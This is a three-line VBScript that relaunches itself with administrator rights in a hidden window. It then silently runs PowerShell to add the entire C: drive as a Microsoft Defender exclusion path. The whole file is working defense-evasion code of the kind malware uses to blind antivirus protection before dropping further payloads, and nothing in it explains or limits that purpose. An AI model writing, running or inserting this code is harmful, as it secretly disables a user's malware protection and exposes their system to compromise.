Set s = CreateObject("Shell.Application")
If Not WScript.Arguments.Named.Exists("elevated") Then s.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 0 : WScript.Quit
CreateObject("WScript.Shell").Run "powershell -Command Add-MpPreference -ExclusionPath 'C:\\'", 0, False
